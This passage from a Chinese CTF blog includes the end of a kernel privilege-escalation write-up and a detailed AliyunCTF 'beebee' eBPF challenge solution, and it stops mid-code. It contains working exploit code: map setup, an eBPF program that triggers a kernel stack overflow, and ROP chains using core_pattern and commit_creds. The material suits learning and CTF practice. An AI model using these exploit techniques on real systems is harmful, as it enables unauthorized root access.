*rop)</span></span><br><span class="line">&#123;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x8</span>] = POP_RDI;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x18</span>] = POP_RSP;</span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x20</span>] = rop_addr + START_ROP;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x10</span>] = rop_addr + <span class="number">0x20</span>; <span class="comment">// set pipe_buffer.ops</span></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x28</span>] = PIVOT3;			 <span class="comment">// set pipe_buf_operations.release</span></span><br><span class="line">	*(<span class="type">size_t</span> *)&amp;rop[<span class="number">0x39</span>] = PIVOT2;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// copy_from_user(core_pattern, user_buf, sizeof(user_buf);</span></span><br><span class="line">	ROP(i++) = POP_RDI;</span><br><span class="line">	ROP(i++) = CORE_PATTERN;</span><br><span class="line">	ROP(i++) = POP_RSI2;</span><br><span class="line">	ROP(i++) = (<span class="type">size_t</span>)&amp;user_buf;</span><br><span class="line">	ROP(i++) = POP_RDX;</span><br><span class="line">	ROP(i++) = <span class="keyword">sizeof</span>(user_buf);</span><br><span class="line">	ROP(i++) = COPY_FROM_USER;</span><br><span class="line">	<span class="comment">// msleep(0x10000);</span></span><br><span class="line">	ROP(i++) = POP_RDI;</span><br><span class="line">	ROP(i++) = <span class="number">0x10000</span>;</span><br><span class="line">	ROP(i++) = MSLEEP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	上述便是对于rop链构造的情况，覆盖CORE_PATTERN，与exp最开始监控部分进行交互，最终达到获取权限的效果。</p>
<h1 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h1><p>​	对于该漏洞进行不断调试，了解到了一下真实世界的CVE是如何利用提权的，并且再利用不同版本的内核进行测试，虽然漏洞攻击成功率并不是很高，并且无法对于所有版本的内核均可以使用，但是依旧会引发很大的破坏，并且在调试的过程中也更加清晰的看到对应原理和内核设计的细节，学到了很多东西。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E9%98%BF%E9%87%8C%E4%BA%91CTF--beebee/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="a2ure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="a2ure's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/02/07/%E9%98%BF%E9%87%8C%E4%BA%91CTF--beebee/" class="post-title-link" itemprop="url">AliyunCTF--beebee</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2026-02-07 09:50:00 / Modified: 10:07:58" itemprop="dateCreated datePublished" datetime="2026-02-07T09:50:00+08:00">2026-02-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/recurrence/" itemprop="url" rel="index"><span itemprop="name">recurrence</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AliyunCTF–beebee"><a href="#AliyunCTF–beebee" class="headerlink" title="AliyunCTF–beebee"></a>AliyunCTF–beebee</h1><h1 id="一-背景介绍"><a href="#一-背景介绍" class="headerlink" title="一.背景介绍"></a>一.背景介绍</h1><h3 id="1-1-题目背景讲解"><a href="#1-1-题目背景讲解" class="headerlink" title="1.1 题目背景讲解"></a>1.1 题目背景讲解</h3><p>​	通过对于题目解包之后可以看到了提供了patch，通过patch可以观察到这是一个通过bpf helper注册了一个bpf_aliyunctf_xor的函数，原理也很简单，将一个指针通过异或2025赋值给另一个指针，并且通过对应的type可以看出对于第二个指针指定的类型时read only，因此漏洞点就是在这里，可以将一个不可写的地址进行写。因此接下来我们需要了解一下ebpf的原理。</p>
<p><img src="/images/beebee/1740726989847.jpg" alt="1740726989847"></p>
<h3 id="1-2-eBPF的背景知识"><a href="#1-2-eBPF的背景知识" class="headerlink" title="1.2 eBPF的背景知识"></a>1.2 eBPF的背景知识</h3><h4 id="1-2-1-eBPF汇编编程"><a href="#1-2-1-eBPF汇编编程" class="headerlink" title="1.2.1 eBPF汇编编程"></a>1.2.1 eBPF汇编编程</h4><p>​	eBPF（Extended Berkeley Packet Filter）是一种基于内核虚拟机的可编程技术，允许开发者通过在内核中安全运行<strong>沙盒化程序</strong>动态扩展内核功能，无需修改内核源码。其工作流程分为三个阶段：<strong>程序编写</strong>（可通过底层eBPF汇编指令或C等高级语言实现）、<strong>验证与加载</strong>（内核验证器确保代码安全无风险）、<strong>执行与交互</strong>（JIT编译后挂载至事件钩子，通过映射结构与用户态交互）。其中，eBPF汇编提供对指令级操作的<strong>精细控制</strong>，适合性能优化或特定场景突破；而高级语言（如C）通过编译器自动处理类型与边界检查，显著提升开发效率，更适合构建生产级工具（如网络监控、安全防御），两者在控制粒度与开发成本间形成互补。</p>
<p>​	之后介绍一下对于ebpf中eBPF汇编指令的介绍，eBPF 由 11 个 64 位寄存器、一个程序计数器和一个 512 字节的大 BPF 堆栈空间组成。寄存器被命名为r0- r10。操作模式默认为 64 位。64位的寄存器也可作32 位子寄存器使用，它们只能通过特殊的 ALU（算术逻辑单元）操作访问，使用低32位，高32位使用零填充。</p>
<p><img src="/images/beebee/1740739458259.jpg" alt="1740739458259"></p>
<p>​	具体的指令格式如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">bpf_insn</span> &#123;</span><br><span class="line"> __u8 code;  <span class="comment">/* opcode */</span></span><br><span class="line"> __u8 dst_reg:<span class="number">4</span>; <span class="comment">/* dest register */</span></span><br><span class="line"> __u8 src_reg:<span class="number">4</span>; <span class="comment">/* source register */</span></span><br><span class="line"> __s16 off;  <span class="comment">/* signed offset */</span></span><br><span class="line"> __s32 imm;  <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​	对于函数调用通过BPF_CALL指令调用内核预定义的辅助函数（如map_lookup_elem）或自定义函数（如BPF_FUNC_aliyunctf_xor），参数需按约定存入r1-r5寄存器，代码中通过BPF_RAW_INSN调用辅助函数实现数据查找和加解密操作。</p>
<p><strong>1.2.2 高级语言实现eBPF编程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">trace_execve</span><span class="params">(<span class="keyword">struct</span> bpf_sock_addr *ctx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> msg[] = <span class="string">&quot;execve syscall triggered&quot;</span>;</span><br><span class="line">    bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> _license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​	一个C语言编写的eBPF程序开发流程通常遵循以下步骤（以用户提供的execve跟踪程序为例）：首先需要包含内核头文件（如linux&#x2F;bpf.h）和辅助函数库（如bpf&#x2F;bpf_helpers.h），通过SEC()宏定义程序挂载点（示例中为tracepoint&#x2F;syscalls&#x2F;sys_enter_execve），并在处理函数中实现核心逻辑——本例使用bpf_trace_printk()向内核调试日志输出触发信息，同时必须声明GPL许可证（char _license[]）以满足内核验证要求。该程序实现了对execve系统调用的动态监控功能，当进程执行新程序时，eBPF程序会被触发并记录事件。除系统调用跟踪外，eBPF还可实现网络包过滤（如XDP程序优化网络转发）、性能分析（通过BPF_PERF_OUTPUT映射实时统计CPU&#x2F;内存指标）、安全防护（如检测异常进程行为），以及容器环境下的资源监控（通过cgroup挂载点关联容器ID）。开发者还可结合BPF_MAP_TYPE_HASH等数据结构实现更复杂的状态跟踪，或通过kprobe&#x2F;uprobe挂钩内核&#x2F;用户空间函数进行深度分析。</p>
<h3 id="1-3-sk-buff"><a href="#1-3-sk-buff" class="headerlink" title="1.3 sk_buff"></a>1.3 sk_buff</h3><p>​	题目栈溢出主要是通过利用BPF_FUNC_skb_load_bytes函数实现对于传入的skb包的内容转存到某片内存区域，因此我们需要了解一下这里的sk_buff，在linux的网络中有很重要的地位。下图展示了对应sk_buff中的存储数据指针信息。</p>
<p><img src="/images/beebee/1740816536277.jpg" alt="1740816536277"></p>
<ol>
<li>sk_buff结构数据区刚被申请好，此时 head 指针、data 指针、tail 指针都是指向同一个地方。head 指针和 end 指针指向的位置一直都不变，而对于数据的变化和协议信息的添加都是通过 data 指针和 tail 指针的改变来表现的。</li>
<li>开始准备存储应用层下发过来的数据，通过调用函数 skb_reserve() 来使 data 指针和 tail 指针同时向下移动，空出一部分空间来为后期添加协议信息。</li>
<li>开始存储数据了，通过调用函数 skb_put() 来使 tail 指针向下移动空出空间来添加数据，此时 skb-&gt;data 和 skb-&gt;tail 之间存放的都是数据信息，无协议信息。</li>
<li>这时就开始调用函数 skb_push() 来使 data 指针向上移动，空出空间来添加各层协议信息。直到最后到达二层，添加完帧头然后就开始发包了。</li>
</ol>
<p>​	因此对于上述来说我们通过伪造对应的data数据段就可以最终复制到我们指定的内存区域，但是在具体操作的时候会发现，在利用BPF_PROG_TYPE_SOCKET_FILTER的eBPF的prog_type时，利用BPF_PROG_TEST_RUN测试运行时的数据复制会在测试数据之前的0xe的大小开始复制，通过上述推测，应当是存储MAC的数据帧头包含源&#x2F;目的MAC地址和协议类型。此时对应的sk_buff的结构如下：</p>
<p><img src="/images/beebee/1740817850319.jpg" alt="1740817850319"></p>
<p><img src="/images/beebee/1740817881785.jpg" alt="1740817881785"></p>
<p>​	因此通过观察可以发现协议部分一共有0x4e大小的内容，通过test.data_in可以模拟以太网数据包，从data数据前0xe大小的地址开始进行复制内存。</p>
<h3 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 总结</h3><p>​	自此已经基本了解了eBPF可以实现那些功能并且了解到具体的原理，利用这些背景就可以实现后面的攻击利用了，主要就是通过利用对于只读的map进行写，构造出超出aBPF预期的行为，最终实现越界写，构造栈溢出，最终实现权限提升。</p>
<h1 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二. 漏洞利用"></a>二. 漏洞利用</h1><h3 id="2-1-题目环境解析"><a href="#2-1-题目环境解析" class="headerlink" title="2.1 题目环境解析"></a>2.1 题目环境解析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M  \</span><br><span class="line">-smp 2 \</span><br><span class="line">-kernel bzImage    \</span><br><span class="line">-append &quot;console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0&quot;     \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-drive file=./flag,if=virtio,format=raw,readonly=on \</span><br><span class="line">-nographic  \</span><br><span class="line">-net nic,model=e1000 \</span><br><span class="line">-no-reboot \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure>

<p>​	根据上述启动脚本，我们可以看到并没有很多保护，并且也没有kalsr，因此只需要对于基地址进行rop就可以完成整个攻击流程。</p>
<h3 id="2-2-初始化设置只读map"><a href="#2-2-初始化设置只读map" class="headerlink" title="2.2 初始化设置只读map"></a>2.2 初始化设置只读map</h3><p>​	首先观察漏洞我们可以发现，这里主要是通过对于只读的地址实现写的漏洞，因此最先就是创建一个只读的map，之后利用漏洞函数bpf_aliyunctf_xor，实现对于可读的内存覆盖，首先为了创建一个只读的地址区域，先创建了一个map。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_type = BPF_MAP_TYPE_ARRAY;</span><br><span class="line">    attr.key_size = <span class="number">4</span>;</span><br><span class="line">    attr.value_size = <span class="number">8</span>;</span><br><span class="line">    attr.max_entries = <span class="number">1</span>;</span><br><span class="line">    attr.map_flags = BPF_F_RDONLY_PROG;</span><br><span class="line">    array_map_fd = SYSCHK(syscall(SYS_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是初始化这个map的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> value[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        *(<span class="type">long</span> <span class="type">long</span>*)&amp;value[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">        attr.map_fd = array_map_fd;</span><br><span class="line">        attr.key = (<span class="type">size_t</span>)&amp;key;</span><br><span class="line">        attr.value = (<span class="type">size_t</span>)&amp;value;</span><br><span class="line">        SYSCHK(syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是讲这个map设置为只读的map</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = array_map_fd;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_MAP_FREEZE, &amp;attr, <span class="keyword">sizeof</span>(attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	自此就已经完成了对于创建一个只读的map内存地址区域，之后就是需要利用这个只读的map创建一个非预期的数据内容（超出本身的预期值大小），最终利用这个内容调用bpf_skb_load_bytes函数，就可以实现出栈溢出的攻击。</p>
<h3 id="2-3-通过漏洞设置非预期数值实现栈溢出攻击"><a href="#2-3-通过漏洞设置非预期数值实现栈溢出攻击" class="headerlink" title="2.3 通过漏洞设置非预期数值实现栈溢出攻击"></a>2.3 通过漏洞设置非预期数值实现栈溢出攻击</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),<span class="comment">// if r0!=0 skip next (校验map查找结果)</span></span><br><span class="line">    BPF_EXIT_INSN(),                       <span class="comment">// exit (查找失败直接退出)[2](@ref)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">    BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">    BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​	首先就是利用上述的eBPF的汇编指令就可以实现上述效果，接下来分部进行解释，首先对于第一个指令主要时保存r1寄存器里面的值，由于时利用BPF_PROG_TYPE_SOCKET_FILTER的协议，因此r1中存储的就是后面调用skb_load_bytes需要存储信息的sk_buff结构体指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),   <span class="comment">// mov64 r9, r1 (保存上下文指针)</span></span><br></pre></td></tr></table></figure>

<p>​	之后利用下面这部分代码可以实现对于map_lookup_elem函数找到对应key的value指针，也就是后面希望修改只读区域的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-16</span>, <span class="number">0</span>),<span class="comment">// [fp-16]=0 (栈空间预置零)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  <span class="comment">// mov64 r2, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-16</span>),<span class="comment">// r2 -= 16 (计算map key地址)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, array_map_fd),<span class="comment">// r1 = map_fd (加载BPF map文件描述符)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),<span class="comment">// map查找调用</span></span><br></pre></td></tr></table></figure>

<p>​	接下来就是利用漏洞函数aliyunctf_xor实现对于非预期的数值构造，利用刚刚获得到的value指针，我们可以设置值为0x80也就是后面复制skb_load_bytes的字节数，按照可读进行预测，这里应该不会发生改变还是0但是由于存在漏洞导致编程0x80。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),   <span class="comment">// mov64 r3, r0 (保存查找到的value指针)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),   <span class="comment">// mov64 r7, r0 (备份value指针)</span></span><br><span class="line">   BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r6 = [r7+0] (加载map存储值)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x18</span>, <span class="number">2025</span> ^ (<span class="number">0x80</span>)),<span class="comment">// [fp-24]=2025^0x80 (异或运算存储)</span></span><br><span class="line">   BPF_ST_MEM(BPF_W, BPF_REG_10, <span class="number">-0x14</span>, <span class="number">0</span>),<span class="comment">// [fp-20]=0 (栈空间初始化)</span></span><br><span class="line">   BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),  <span class="comment">// mov64 r1, fp</span></span><br><span class="line">   BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">-0x18</span>),<span class="comment">// r1 -= 24 (计算异或参数地址)</span></span><br><span class="line">   BPF_MOV64_IMM(BPF_REG_2, <span class="number">8</span>),           <span class="comment">// mov64 r2, 8 (设置参数长度)</span></span><br><span class="line">   BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_aliyunctf_xor),<span class="comment">// 调用自定义异或函数</span></span><br></pre></td></tr></table></figure>

<p>​	最后就是调用skb_load_bytes把data复制到指定的内存区域，这里指定的地址时rbp - 8的地址，因此我们需要在之前说的MAC帧头0xe的基础上加上0x10大小的数据区域就可以控制最终的返回值，覆盖成commit_creds(init_cred())就可以实现权限提升了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),   <span class="comment">// mov64 r1, r9 (恢复上下文指针)</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),           <span class="comment">// mov64 r2, 0 (设置偏移量)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),  <span class="comment">// mov64 r3, fp</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-8</span>), <span class="comment">// r3 -= 8 (计算存储地址)</span></span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, <span class="number">0</span>),<span class="comment">// r4 = [r7+0] (再次加载map值)</span></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes),<span class="comment">// 加载数据包字节</span></span><br><span class="line">BPF_EXIT_INSN()                        <span class="comment">// exit (程序退出)</span></span><br></pre></td></tr></table></figure>

<p>​	之后就是利用BPF_PROG_TYPE_SOCKET_FILTER进行test run,并且存储好伪造的数据也就是在30（0xe + 0x10）这里，自此就完成了整个攻击的全部流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Load BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">        .insn_cnt = <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">        .insns = (<span class="type">uint64_t</span>)prog,</span><br><span class="line">        .log_buf = (<span class="type">uint64_t</span>)log_buf,</span><br><span class="line">        .log_size = LOG_BUF_SZ,</span><br><span class="line">        .log_level = <span class="number">1</span> | <span class="number">2</span>,</span><br><span class="line">        .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> prog_fd = SYSCHK(syscall(SYS_bpf, BPF_PROG_LOAD, &amp;prog_attr, <span class="keyword">sizeof</span>(prog_attr)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prepare ROP chain</span></span><br><span class="line">    <span class="type">char</span> data_buf[<span class="number">4096</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">md</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="type">size_t</span>* rop_chain = (<span class="type">size_t</span>*)&amp;data_buf[<span class="number">30</span>];</span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8130d3de</span>; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff82a52fa0</span>; <span 